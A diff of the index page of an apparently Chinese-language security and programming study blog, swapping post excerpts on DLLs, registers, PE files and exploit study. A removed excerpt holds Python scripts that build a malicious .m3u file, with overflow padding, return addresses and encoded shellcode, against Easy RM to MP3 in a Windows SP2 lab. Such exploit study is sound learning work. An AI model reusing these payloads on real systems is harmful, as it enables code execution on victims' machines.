@@ -157,20 +157,20 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-迫使shellcode执行方法" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-exploit_3_基于SEH的exploit_1" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2018/08/20/迫使shellcode执行方法/">exploit_2_迫使shellcode执行方法</a>
+      <a class="article-title" href="/2018/08/20/exploit_3_基于SEH的exploit_1/">exploit_3_基于SEH的exploit_1</a>
     </h1>
   
 
 		
         
-        <a href="/2018/08/20/迫使shellcode执行方法/" class="archive-article-date">
+        <a href="/2018/08/20/exploit_3_基于SEH的exploit_1/" class="archive-article-date">
   	<time datetime="2018-08-20T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-20</time>
 </a>
         
@@ -179,27 +179,19 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>实验版本:<br>windows sp2<br>Easy RM to MP3 2.7.3.700<br>ollydbg</p>
-<p>跳转方法:</p>
+        <p>实验版本:<br>windows sp2<br>soritong mp3 player 1.0<br>ollydbg</p>
+<blockquote>
+<p>基础知识</p>
+</blockquote>
+<p>在xp sp1后S添加了GS/DEP/SafeSEH以及其他保护机制</p>
 <ul>
-<li>jmp/call<br>如果有寄存器可以利用来跳转到shellcode,则可以使用该方法来进行跳转<br>例如:jmp esp/call esp</li>
-<li>pop retn/popad<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">popad 0x61</span><br><span class="line">pop eax 58</span><br><span class="line">pop ebx 5b</span><br><span class="line">pop ecx 59</span><br><span class="line">pop edx 5a</span><br><span class="line">pop esi 5e</span><br><span class="line">pop ebp 5d</span><br><span class="line">retn    C3</span><br><span class="line"></span><br><span class="line">python 脚本</span><br><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">with open(&quot;crash.m3u&quot;,&quot;w+&quot;) as f:</span><br><span class="line">    f.write(&quot;\x41&quot; * (25000+1067))</span><br><span class="line">    f.write(&quot;\x5C\xDF\x80\x7C&quot; ) #eip pop pop retn</span><br><span class="line">    f.write(&quot;\x90&quot; *4 ) #retn4</span><br><span class="line">    f.write(&quot;\xCC&quot;)</span><br><span class="line">    f.write(&quot;\x90&quot; * 6)</span><br><span class="line">    f.write(&quot;\xCC&quot;)</span><br><span class="line">    f.write(&quot;\x31\xae\x80\x7c&quot; ) #eip jmp esp</span><br><span class="line">    f.write(&quot;\x90&quot; * 25) #必须 如果确实这些会shellcode会执行错误</span><br><span class="line">    buf = &quot;&quot;</span><br><span class="line">    buf += &quot;\x89\xe7\xdd\xc1\xd9\x77\xf4\x5e\x56\x59\x49\x49\x49&quot;</span><br><span class="line">    buf += &quot;\x49\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33&quot;</span><br><span class="line">    buf += &quot;\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41&quot;</span><br><span class="line">    buf += &quot;\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41&quot;</span><br><span class="line">    buf += &quot;\x42\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43\x4a&quot;</span><br><span class="line">    buf += &quot;\x4a\x49\x58\x59\x4a\x4b\x4d\x4b\x38\x59\x34\x34\x36&quot;</span><br><span class="line">    buf += &quot;\x44\x4b\x44\x30\x31\x39\x42\x4f\x42\x33\x47\x46\x51&quot;</span><br><span class="line">    buf += &quot;\x48\x49\x33\x54\x4c\x4b\x32\x51\x56\x50\x4c\x4b\x52&quot;</span><br><span class="line">    buf += &quot;\x56\x34\x4c\x4c\x4b\x33\x46\x55\x4c\x4c\x4b\x37\x36&quot;</span><br><span class="line">    buf += &quot;\x53\x38\x4c\x4b\x53\x4e\x47\x50\x4c\x4b\x46\x56\x46&quot;</span><br><span class="line">    buf += &quot;\x58\x50\x4f\x45\x48\x44\x35\x4c\x33\x46\x39\x45\x51&quot;</span><br><span class="line">    buf += &quot;\x48\x51\x4b\x4f\x4b\x51\x55\x30\x4c\x4b\x42\x4c\x57&quot;</span><br><span class="line">    buf += &quot;\x54\x31\x34\x4c\x4b\x37\x35\x47\x4c\x4c\x4b\x56\x34&quot;</span><br><span class="line">    buf += &quot;\x36\x48\x32\x58\x35\x51\x4b\x5a\x4c\x4b\x30\x4a\x45&quot;</span><br><span class="line">    buf += &quot;\x48\x4c\x4b\x51\x4a\x51\x30\x55\x51\x4a\x4b\x5a\x43&quot;</span><br><span class="line">    buf += &quot;\x30\x34\x30\x49\x4c\x4b\x46\x54\x4c\x4b\x35\x51\x4a&quot;</span><br><span class="line">    buf += &quot;\x4e\x46\x51\x4b\x4f\x50\x31\x4f\x30\x4b\x4c\x4e\x4c&quot;</span><br><span class="line">    buf += &quot;\x4d\x54\x39\x50\x52\x54\x33\x37\x49\x51\x38\x4f\x44&quot;</span><br><span class="line">    buf += &quot;\x4d\x35\x51\x49\x57\x5a\x4b\x4c\x34\x57\x4b\x43\x4c&quot;</span><br><span class="line">    buf += &quot;\x31\x34\x47\x58\x32\x55\x4d\x31\x4c\x4b\x30\x5a\x57&quot;</span><br><span class="line">    buf += &quot;\x54\x53\x31\x4a\x4b\x42\x46\x4c\x4b\x54\x4c\x30\x4b&quot;</span><br><span class="line">    buf += &quot;\x4c\x4b\x50\x5a\x35\x4c\x53\x31\x5a\x4b\x4c\x4b\x35&quot;</span><br><span class="line">    buf += &quot;\x54\x4c\x4b\x35\x51\x4b\x58\x4d\x59\x30\x44\x51\x34&quot;</span><br><span class="line">    buf += &quot;\x45\x4c\x45\x31\x49\x53\x48\x32\x43\x38\x47\x59\x49&quot;</span><br><span class="line">    buf += &quot;\x44\x4d\x59\x4d\x35\x4c\x49\x59\x52\x33\x58\x4c\x4e&quot;</span><br><span class="line">    buf += &quot;\x30\x4e\x54\x4e\x4a\x4c\x51\x42\x4d\x38\x4d\x4f\x4b&quot;</span><br><span class="line">    buf += &quot;\x4f\x4b\x4f\x4b\x4f\x4c\x49\x50\x45\x34\x44\x4f\x4b&quot;</span><br><span class="line">    buf += &quot;\x43\x4e\x49\x48\x4d\x32\x52\x53\x4c\x47\x45\x4c\x57&quot;</span><br><span class="line">    buf += &quot;\x54\x31\x42\x4b\x58\x4c\x4e\x4b\x4f\x4b\x4f\x4b\x4f&quot;</span><br><span class="line">    buf += &quot;\x4b\x39\x30\x45\x34\x48\x32\x48\x52\x4c\x32\x4c\x51&quot;</span><br><span class="line">    buf += &quot;\x30\x51\x51\x45\x38\x57\x43\x36\x52\x46\x4e\x33\x54&quot;</span><br><span class="line">    buf += &quot;\x35\x38\x32\x55\x34\x33\x43\x55\x34\x32\x46\x50\x49&quot;</span><br><span class="line">    buf += &quot;\x4b\x4c\x48\x31\x4c\x46\x44\x55\x5a\x4b\x39\x4d\x36&quot;</span><br><span class="line">    buf += &quot;\x50\x56\x4b\x4f\x46\x35\x54\x44\x4c\x49\x58\x42\x50&quot;</span><br><span class="line">    buf += &quot;\x50\x4f\x4b\x49\x38\x39\x32\x50\x4d\x4f\x4c\x4c\x47&quot;</span><br><span class="line">    buf += &quot;\x45\x4c\x57\x54\x46\x32\x4a\x48\x51\x4f\x4b\x4f\x4b&quot;</span><br><span class="line">    buf += &quot;\x4f\x4b\x4f\x35\x38\x42\x4f\x43\x48\x56\x38\x57\x50&quot;</span><br><span class="line">    buf += &quot;\x45\x38\x43\x51\x42\x47\x45\x35\x31\x52\x35\x38\x30&quot;</span><br><span class="line">    buf += &quot;\x4d\x43\x55\x54\x33\x43\x43\x50\x31\x59\x4b\x4b\x38&quot;</span><br><span class="line">    buf += &quot;\x51\x4c\x36\x44\x35\x5a\x4c\x49\x5a\x43\x53\x58\x30&quot;</span><br><span class="line">    buf += &quot;\x58\x37\x50\x51\x30\x51\x30\x52\x48\x50\x4d\x36\x33&quot;</span><br><span class="line">    buf += &quot;\x51\x56\x31\x31\x35\x38\x53\x42\x42\x4f\x52\x4d\x47&quot;</span><br><span class="line">    buf += &quot;\x50\x35\x38\x42\x4f\x46\x4c\x47\x50\x45\x36\x45\x38&quot;</span><br><span class="line">    buf += &quot;\x57\x38\x42\x45\x32\x4c\x42\x4c\x50\x31\x58\x49\x4c&quot;</span><br><span class="line">    buf += &quot;\x48\x50\x4c\x57\x54\x34\x50\x4c\x49\x4d\x31\x50\x31&quot;</span><br><span class="line">    buf += &quot;\x38\x52\x36\x32\x56\x33\x56\x31\x46\x32\x4b\x4f\x4e&quot;</span><br><span class="line">    buf += &quot;\x30\x36\x51\x49\x50\x36\x30\x4b\x4f\x50\x55\x53\x38&quot;</span><br><span class="line">    buf += &quot;\x41\x41&quot;</span><br><span class="line">    f.write(buf)</span><br></pre></td></tr></table></figure>
+<li>Xor<br>在调用异常处理例程之前,所有的寄存器都会先被清空</li>
+<li><p>Dep&amp;Stack Cookies</p>
 </li>
-</ul>
-<p>当缓冲区起始于栈顶下方时,可以使用一系列的POP指令和RET指令,来使字节弹出zhan,ESP指针越来越接近shellcode,当最后执行RET会将shellcode地址压入EIP</p>
-<ul>
-<li><p>push return</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">push esp 54</span><br><span class="line">retn     C3</span><br><span class="line"></span><br><span class="line">当寄存器指向shellcode,但是没有jump Reg/call Reg,则可以通过push Reg</span><br><span class="line">retn</span><br><span class="line">由于retn会将Reg的内容压入Eip</span><br><span class="line"></span><br><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">with open(&quot;crash.m3u&quot;,&quot;w+&quot;) as f:</span><br><span class="line">    f.write(&quot;\x41&quot; * (25000+1067))</span><br><span class="line">    f.write(&quot;\x5C\xDF\x80\x7C&quot; ) #pop pop retn</span><br><span class="line">    f.write(&quot;\x90&quot; *4 ) #retn4</span><br><span class="line">    f.write(&quot;\xCC&quot;)</span><br><span class="line">    f.write(&quot;\x90&quot; * 6)</span><br><span class="line">    f.write(&quot;\xCC&quot;)</span><br><span class="line">    f.write(&quot;\x72\x1E\x81\x7c&quot; ) #eip push esp retn</span><br></pre></td></tr></table></figure>
+<li><p>SafeSEH<br>新增一些额外保护,禁止非法的SEH覆盖</p>
 </li>
-<li><p>jmp [reg + offset]</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">寄存器指向包含shellcode地址的缓冲区,但是没有指向入口,通过指向</span><br><span class="line">jmp [Reg+offset]跳转到入口</span><br></pre></td></tr></table></figure>
+<li><p>Windows 2003</p>
 </li>
-<li><p>SHE<br>通过自己的地址去覆盖SHE,迫使跳转至shellcode,但是需要处理safeShe以及SHEOP</p>
-</li>
-<li><p>应对狭窄型缓冲区<br>利用跳转指令跳至任意地址</p>
-</li>
-<li><p>short jumps/conditional jumps</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">jmp short 0xeb</span><br><span class="line"></span><br><span class="line">条件跳转:</span><br><span class="line">根据EFLAGS寄存器的状态来实现跳转</span><br></pre></td></tr></table></figure></li>
 </ul>
 
       
@@ -224,7 +216,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2018/08/20/迫使shellcode执行方法/">展开全文 >></a>
+          <a class="article-more-a" href="/2018/08/20/exploit_3_基于SEH的exploit_1/">展开全文 >></a>
         </p>
       
 
@@ -353,118 +345,6 @@
         <!-- 目录内容结束 -->
 
   
-    <article id="post-dll文件的导出和调用" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/08/20/dll文件的导出和调用/">DLL文件的导出和调用</a>
-    </h1>
-  
-
-		
-        
-        <a href="/2018/08/20/dll文件的导出和调用/" class="archive-article-date">
-  	<time datetime="2018-08-20T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-20</time>
-</a>
-        
-      </header>
-
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <blockquote>
-<p>导出函数的方式</p>
-</blockquote>
-<ul>
-<li><p>关键字导出:_declspec(dllexport)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 导出一个全局变量</span><br><span class="line">  _declspec(dllexport) DWORD g_nNum;</span><br><span class="line">  // 导出一个函数</span><br><span class="line">  _declspec(dllexport) void fun() &#123;</span><br><span class="line">      MessageBox(0, L&quot;fun&quot;, 0, 0);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>def模块定义导出</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.添加.def格式文件到项目</span><br><span class="line">2.visual c++中属性-&gt;链接器-&gt;输入-&gt;模块定义文件 填写.def格式文件名称</span><br><span class="line">3. .def文件中,填写要导出的函数</span><br><span class="line">	EXPORTS</span><br><span class="line">	函数名 @序号 ;@序号 表示导出函数的序号</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<blockquote>
-<p>DLL文件的调用</p>
-</blockquote>
-<ul>
-<li><p>显式调用</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">步骤:</span><br><span class="line">1.将(LoadLibrary)DLL加载到进程中. 得到DLL模块句柄</span><br><span class="line">2.获取dll的导出函数 (GetProcAddress ), 定义函数指针, 保存导出函数的地址</span><br><span class="line">3.通过函数指针调用导出函数.</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>隐式调用</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.包含对应的头文件(包含了DLL导出函数的原型信息的头文件)</span><br><span class="line">2.包含对应的导入库</span><br><span class="line">	#pragma comment(lib , &quot;../debug/DllTest.lib&quot;)</span><br><span class="line">3.直接调用函数</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<blockquote>
-<p>DLL文件的调试</p>
-</blockquote>
-<ul>
-<li>dll与exe都是自己写的,直接F11进入DLL代码中</li>
-<li><p>dll是自己编写,exe不是自己编写</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.dll项目中,在项目属性中 配置属性-&gt;调试-&gt;命令 添加调用dll导出函数的exe的路径</span><br><span class="line">在dll导出函数中,下断点，然后以调试方式运行dll项目</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>dll与exe都不是自己编写,只能使用汇编级调试器。</p>
-</li>
-</ul>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Window编程原理</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/08/20/dll文件的导出和调用/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
- <!-- 目录内容 -->
-             
-        <!-- 目录内容结束 -->
-
-  
     <article id="post-JAVA文件操作" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -545,20 +425,20 @@
         <!-- 目录内容结束 -->
 
   
-    <article id="post-PE文件数据结构" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-基于SEH的exploit" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2018/08/20/PE文件数据结构/">PE文件数据结构</a>
+      <a class="article-title" href="/2018/08/20/基于SEH的exploit/">基于SEH的exploit</a>
     </h1>
   
 
 		
         
-        <a href="/2018/08/20/PE文件数据结构/" class="archive-article-date">
+        <a href="/2018/08/20/基于SEH的exploit/" class="archive-article-date">
   	<time datetime="2018-08-20T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-20</time>
 </a>
         
@@ -567,11 +447,6 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <blockquote>
-<p>IMAGE_DOS_HEADER dos头部</p>
-</blockquote>
-        
-          <a class="article-more-a" href="/2018/08/20/PE文件数据结构/#more">more >></a>
         
       
 
@@ -585,7 +460,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Window编程原理</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">shellcode</a>
         		</li>
       		
 		</ul>
@@ -595,7 +470,89 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2018/08/20/PE文件数据结构/">展开全文 >></a>
+          <a class="article-more-a" href="/2018/08/20/基于SEH的exploit/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+ <!-- 目录内容 -->
+             
+        <!-- 目录内容结束 -->
+
+  
+    <article id="post-android_studio_install" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/08/20/android_studio_install/">android studio install</a>
+    </h1>
+  
+
+		
+        
+        <a href="/2018/08/20/android_studio_install/" class="archive-article-date">
+  	<time datetime="2018-08-20T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-20</time>
+</a>
+        
+      </header>
+
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <ol>
+<li>一直停留在fetching Android sdk compoment information界面<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">解决方法：</span><br><span class="line">　　1）找到安装的Android Studio目录下的bin目录。找到idea.properties文件，用文本编辑器打开。　　</span><br><span class="line">    2）在idea.properties文件末尾添加一行： disable.android.first.run=true ，然后保存文件。　　</span><br><span class="line">    3）关闭Android Studio后重新启动，便可进入界面。</span><br></pre></td></tr></table></figure></li>
+</ol>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">android</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/08/20/android_studio_install/">展开全文 >></a>
         </p>
       
 
@@ -711,288 +668,6 @@
         <!-- 目录内容结束 -->
 
   
-    <article id="post-汇编1_寄存器" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/08/20/汇编1_寄存器/">汇编学习1寄存器</a>
-    </h1>
-  
-
-		
-        
-        <a href="/2018/08/20/汇编1_寄存器/" class="archive-article-date">
-  	<time datetime="2018-08-20T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-20</time>
-</a>
-        
-      </header>
-
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <blockquote>
-<p>CPU寄存器</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">通用寄存器:</span><br><span class="line">32位:</span><br><span class="line">EAX,EBX,ECX,EDX</span><br><span class="line">ESI:源变址寄存器</span><br><span class="line">EDI:目的变址寄存器</span><br><span class="line">ESP:栈顶指针</span><br><span class="line">EBP:栈底指针</span><br><span class="line">16位:</span><br><span class="line">AX,BX,CX,DX</span><br><span class="line">SI,DI,SP,BP</span><br><span class="line">8位:</span><br><span class="line">AH,AL,BH,BL,CH,CL,DH,DL</span><br><span class="line"></span><br><span class="line">指令指针寄存器:EIP,IP 与CS联用指向下一个指令的物理地址</span><br><span class="line"></span><br><span class="line">标志位寄存器FLAGS</span><br><span class="line">状态标志</span><br><span class="line">0 CF 进位标志    进位或借位置1，否则置0    无符号是有效</span><br><span class="line">2 PF 奇偶标志    低8位 1的个数，奇数个为0，偶数个为1</span><br><span class="line">4 AF 辅助标志    低半字节是否有进位或借位</span><br><span class="line">6 ZF 零标志        结果是0置1，否则置0    </span><br><span class="line">7 SF 符号标志    最高位为1则置1，否则置0</span><br><span class="line">11 OF 溢出标志   溢出OF为1，否则为0    有符号数运算是否超出范围</span><br><span class="line">控制标志</span><br><span class="line">8 TF 陷阱标志   TF=0，处理器正常工作，TF=1，处理器单步执行指令</span><br><span class="line">9 IF 中断标志    IF=1 允许中断，IF=0，禁止中断 CLI(IF=0) STI(IF=1)</span><br><span class="line">10 DF 方向标志 DF=0 存储器地址自动增加 DF=1 存储器地址自动减少</span><br><span class="line"></span><br><span class="line">段寄存器:</span><br><span class="line">CS:代码段的起始位置</span><br><span class="line">DS:数据段的起始位置</span><br><span class="line">ES:附加段的起始位置</span><br><span class="line">SS:堆栈段的起始位置</span><br><span class="line">没有指明情况下，数据访问在DS段,BP访问内存在SS段</span><br><span class="line">段超越: 一般数据访问(DS)，BP基址的寻址方式(SS)，串操作的源操作数(DS)</span><br><span class="line">	可以使用（段寄存器:）实现超越</span><br></pre></td></tr></table></figure>
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">汇编</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/08/20/汇编1_寄存器/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
- <!-- 目录内容 -->
-             
-        <!-- 目录内容结束 -->
-
-  
-    <article id="post-PE文件编程" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/08/20/PE文件编程/">PE文件编程</a>
-    </h1>
-  
-
-		
-        
-        <a href="/2018/08/20/PE文件编程/" class="archive-article-date">
-  	<time datetime="2018-08-20T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-20</time>
-</a>
-        
-      </header>
-
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <blockquote>
-<p>读取文件</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">char* ReadFileToMem(char *pFilePath) &#123;</span><br><span class="line">	HANDLE hFile = CreateFileA(pFilePath,</span><br><span class="line">		GENERIC_READ,</span><br><span class="line">		NULL,</span><br><span class="line">		NULL,</span><br><span class="line">		OPEN_EXISTING,</span><br><span class="line">		FILE_ATTRIBUTE_NORMAL,</span><br><span class="line">		NULL</span><br><span class="line">		);</span><br><span class="line">	if (hFile == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">		printf(&quot;File open failed\n&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">	//获取文件大小</span><br><span class="line">	DWORD dwFileSize = GetFileSize(hFile, NULL);</span><br><span class="line">	//申请空间</span><br><span class="line">	char *pFileBuf = new char[dwFileSize];</span><br><span class="line">	//读文件</span><br><span class="line">	DWORD dwRead;</span><br><span class="line">	BOOL bRet = ReadFile(hFile, pFileBuf, dwFileSize, &amp;dwRead, NULL);</span><br><span class="line">	if (bRet) &#123;</span><br><span class="line">		return pFileBuf;</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>判断是否是PE文件</p>
-</blockquote>
